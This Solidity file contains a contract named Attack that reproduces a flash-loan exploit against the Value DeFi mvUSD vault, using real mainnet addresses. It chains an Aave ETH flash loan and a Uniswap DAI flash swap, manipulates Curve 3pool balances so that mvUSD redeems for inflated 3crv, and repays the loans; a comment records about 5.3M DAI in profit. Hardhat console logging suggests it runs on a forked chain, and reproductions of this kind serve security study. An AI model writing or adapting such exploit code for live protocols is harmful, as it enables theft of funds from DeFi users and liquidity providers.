// SPDX-License-Identifier: agpl-3.0
pragma solidity 0.6.12;

import { FlashLoanReceiverBase, ILendingPoolAddressesProvider, ILendingPool } from "./FLInterface.sol";
import { IERC20, IERC20_USDT, IWETH } from "./Interfaces.sol";
import { SafeMath, TransferHelper } from "./Libraries.sol";
import { IValueMultiVault, ValueMultiVaultBank } from "./Value.sol";
import "./IUniswap.sol";
import "hardhat/console.sol";

interface ICurve { 
    function exchange(int128 i, int128 j, uint256 dx, uint256 min_dy) external;
    function remove_liquidity_one_coin(uint256 token_amount, int128 i, uint256 min_amount) external;
}

// Profit: DAI 5,304,471.652322371697366426
contract Attack is FlashLoanReceiverBase {
    using SafeMath for uint256;

    address aaveV1 = 0x24a42fD28C976A61Df5D00D0599C34c4f90748c8;
    address daiAddr = 0x6B175474E89094C44Da98b954EedeAC495271d0F;
    address usdtAddr = 0xdAC17F958D2ee523a2206206994597C13D831ec7;
    address usdcAddr = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    address ethAddr = 0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE;
    address wethAddr = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address daiEthPair = 0xA478c2975Ab1Ea89e8196811F51A7B7Ade33eB11;
    address uniV2Router = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    address curve3pool = 0xbEbc44782C7dB0a1A60Cb6fe97d0b483032FF1C7;
    address mvUsdAddr = 0x55BF8304C78Ba6fe47fd251F37d7beb485f86d26;
    address crv3Token = 0x6c3F90f043a72FA612cbac8115EE7e52BDe6E490;
    address owner;

    constructor ()
        FlashLoanReceiverBase(ILendingPoolAddressesProvider(aaveV1))
        public
    {
        owner = msg.sender;
    }

    function exploit() public {
        // 1. Take FL of 80K ETH from AAVE
        myFlashLoanCall();

        console.log("After the exploit");
        checkBalance(address(this));
    }

    // Request the FL of 80K ETH
    function myFlashLoanCall() internal {
        bytes memory data = "";
        uint256 amount = 80000 ether;

        ILendingPool lendingPool = ILendingPool(addressesProvider.getLendingPool());
        lendingPool.flashLoan(address(this), ethAddr, amount, data);
    }

    function executeOperation(address _reserve, uint256 _amount, uint256 _fee, bytes calldata _params) external override
    {
        // 2. Take FL of 116M DAI from Uniswap
        uint256 daiLoanAmount = (116 * 1e6) * 1e18;
        bytes memory data = "0";
        IUniswapV2Pair(daiEthPair).swap(daiLoanAmount, 0, address(this), data);

        // 10. Convert excess DAI to ETH to repay Aave FL
        uint256 totalDebt = _amount + _fee;
        myApproveWrap(daiAddr, uniV2Router, uint256(-1));
        address[] memory path = new address[](2);
        path[0] = daiAddr;
        path[1] = wethAddr;
        uint256 daiToSwap = IERC20(daiAddr).balanceOf(address(this));
        uint256 ethToGet = totalDebt - address(this).balance;
        IUniswapV2Router02(uniV2Router).swapTokensForExactETH(ethToGet, daiToSwap, path, address(this), block.timestamp);

        transferFundsBackToPoolInternal(_reserve, totalDebt);
    }

    // Called after the uniswap flash loan is received
    function uniswapV2Call(address, uint amount0, uint amount1, bytes calldata) external {
        uint256 daiBorrowed = (amount0 == 0) ? amount1 : amount0;

        // 3. Swap 80K ETH for 31M USDT
        address[] memory path = new address[](2);
        path[0] = wethAddr;
        path[1] = usdtAddr;
        uint256 usdtToBorrow = (31 * 1e6) * 1e6;        
        IUniswapV2Router02(uniV2Router).swapETHForExactTokens {value : address(this).balance }(usdtToBorrow, path, address(this), block.timestamp);

        // 4. Deposit 25M DAI at Value Defi and get X minted mvUSD
        IERC20(daiAddr).approve(mvUsdAddr, uint256(-1));
        uint256 daiToDeposit = (25 * 1e6) * 1e18;

        ValueMultiVaultBank mv = ValueMultiVaultBank(0x8764f2c305b79680CfCc3398a96aedeA9260f7ff);
        mv.deposit(IValueMultiVault(mvUsdAddr), daiAddr, daiToDeposit, 0, false, 0);

        console.log("After 4");
        checkBalance(address(this));

        // 5. Swap DAI and USDT to obtain USDC at Curve 
        // 0: Dai, 1: USDC, 2: USDT
        myApproveWrap(usdtAddr, curve3pool, uint256(-1));
        myApproveWrap(daiAddr, curve3pool, uint256(-1));

        uint256 daiToSwap = (91 * 1e6) * 1e18;
        ICurve(curve3pool).exchange(0, 1, daiToSwap, 0); // Swap DAI for USDC
        uint256 usdcAfterDai = IERC20(usdcAddr).balanceOf(address(this));

        ICurve(curve3pool).exchange(2, 1, usdtToBorrow, 0); // Swap USDT for USDC

        uint256 currBalanceUSDC = IERC20(usdcAddr).balanceOf(address(this));
        uint256 currBalancemvUSD = IERC20(mvUsdAddr).balanceOf(address(this));

        console.log("After swapping for USDC at Curve");
        checkBalance(address(this));

        // 6. Burn X mvUSD for 3crv -- Manipulation happens here
        uint256 crv3Shares = IValueMultiVault(mvUsdAddr).withdrawFor(address(this), currBalancemvUSD, crv3Token, 0);
        console.log("crv3 shares: ", crv3Shares);

        // 7. Restore balances in 3Pool after manipulation - swap USDC for DAI and USDT
        myApproveWrap(usdcAddr, curve3pool, uint256(-1));
        ICurve(curve3pool).exchange(1, 0, usdcAfterDai, 0); // Swap USDC for DAI
        ICurve(curve3pool).exchange(1, 2, currBalanceUSDC - usdcAfterDai, 0); // Swap USDC for USDT

        console.log("After swapping back at Curve");
        checkBalance(address(this));

        // 8. Redeem 3crv shares for DAI
        myApproveWrap(crv3Token, curve3pool, uint256(-1));
        ICurve(curve3pool).remove_liquidity_one_coin(crv3Shares, 0, 0);

        console.log("After manipulation");
        checkBalance(address(this));

        // 9. Repay loans (swap USDT for ETH and repay uniswap DAI loan)
        // Swap USDT for ETH
        myApproveWrap(usdtAddr, uniV2Router, uint256(-1));
        path[0] = usdtAddr;
        path[1] = wethAddr;
        uint256 usdtBal = IERC20(usdtAddr).balanceOf(address(this));
        IUniswapV2Router02(uniV2Router).swapExactTokensForETH(usdtBal, 0, path, address(this), block.timestamp);
        
        // Repay DAI flash swap
        uint256 daiToReturn = daiBorrowed * 1000 / 997 + 1;
        IERC20(daiAddr).transfer(daiEthPair, daiToReturn);
    }

    // USDT needs special handle of its approve function since it doesn't conform to ERC20...
    function myApproveWrap(address _tokenAddr, address _spender, uint256 _amount) internal {
        if (_tokenAddr != usdtAddr)
            require(IERC20(_tokenAddr).approve(_spender, _amount), "ApproveWrap failed");
        else
            IERC20_USDT(usdtAddr).approve(_spender, _amount);
    }

    // Check the balance of a given address in the tokens targeted by the exploit
    function checkBalance(address addressToCheck) public view {
        uint balance;
        console.log("----ATK BALANCES of %s ----", addressToCheck);
        balance = IERC20(mvUsdAddr).balanceOf(address(this));
        console.log("mvUSD: ", balance);
        balance = address(this).balance;
        console.log("ETH: ", balance);
        balance = IERC20(usdtAddr).balanceOf(addressToCheck);
        console.log("USDT: ", balance);        
        balance = IERC20(usdcAddr).balanceOf(addressToCheck);
        console.log("USDC: ", balance);
        balance = IERC20(daiAddr).balanceOf(addressToCheck);
        console.log("DAI: ", balance);
        console.log("----END BALANCES of %s ----", addressToCheck);
    }

    fallback () external payable {}
}